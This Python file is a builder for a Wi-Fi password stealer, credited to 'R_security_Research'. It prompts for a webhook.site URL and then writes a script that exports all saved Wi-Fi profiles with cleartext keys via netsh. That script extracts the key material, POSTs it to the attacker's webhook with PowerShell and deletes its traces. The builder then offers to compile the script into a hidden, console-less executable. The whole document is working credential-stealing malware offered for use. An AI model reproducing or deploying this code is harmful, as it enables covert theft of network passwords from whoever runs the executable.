import os
import subprocess
import termcolor
print(termcolor.colored(""" 
                                    #     #   ###   #######   ###           ######           #####
                                    #  #  #    #    #          #            #     #         #     #
                                    #  #  #    #    #          #            #     #         #
                                    #  #  #    #    #####      #            ######           #####
                                    #  #  #    #    #          #            #                     #
                                    #  #  #    #    #          #            #               #     #
                                     ## ##    ###   #         ###   ####### #asss    ####### ##### tealer...............!
                            
                            
                                               Developed:- R_security_Research
                            
                                               github:- https://github.com/raghu14321
                                               
                                               ((Steal wifi password sending a file))
                            """, 'blue'))
print("")
print(termcolor.colored("Description:- for more update visit git hub , https://github.com/raghu14321", 'yellow'))
print("")
print(termcolor.colored("Visit the Hook site and copy hook link :- https://webhook.site/", 'green'))
print("")
hook = input(termcolor.colored("[+] Enter HERE HOOK URL:- ", 'green'))
print("")
exe = int(input(termcolor.colored("[+] Do you want to send hook site Press(1) :-", 'blue')))
if exe == 1:
    s = open("stealer123.py",mode='w')
    s.write(f"""import os
import subprocess
subprocess.call("netsh wlan export profile key=clear", shell=True)
subprocess.call("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS", shell=True)
subprocess.call("powershell Invoke-WebRequest -Uri  {hook}  -Method POST -InFile Wi-Fi-PASS", shell=True)
subprocess.call("del Wi-* /s /f /q", shell=True)
subprocess.call("exit", shell=True)
""")
    s.close()
    print("FILE IS SAVE AS:- stealer123.py")
    exe1 = input(termcolor.colored("[+] Do you want convert stealer123.py in to stealer123.exe file (y/n) :- ", 'green'))
    if exe1 == "y":
        os.system("clear")
        print(termcolor.colored("""
                                        ####### #     # #######
                                        #        #   #  #
                                        #         # #   #
                                        #####      #    #####
                                        #         # #   #
                                        #        #   #  #
                                        ####### #     # #######
                                       
                                       (( CONVERT PY-TO-EXE ))
                                       
                                       """, 'green'))
        print(termcolor.colored("[+] Converting in to EXE...............!", 'yellow'))
        subprocess.call("pyinstaller stealer123.py --onefile --noconsole", shell=True)
        print(termcolor.colored("OK", 'blue'))
    elif exe1 == "n":
        print(termcolor.colored("FILE IS SAVE AS:- stealer123.py", 'blue'))
    else:
        os.system("exit")
elif exe == 2:
    print(termcolor.colored("[*] Explore more tools (Windows and Linux) visit :- https://github.com/raghu14321", 'green'))
else:
    os.system("exit")
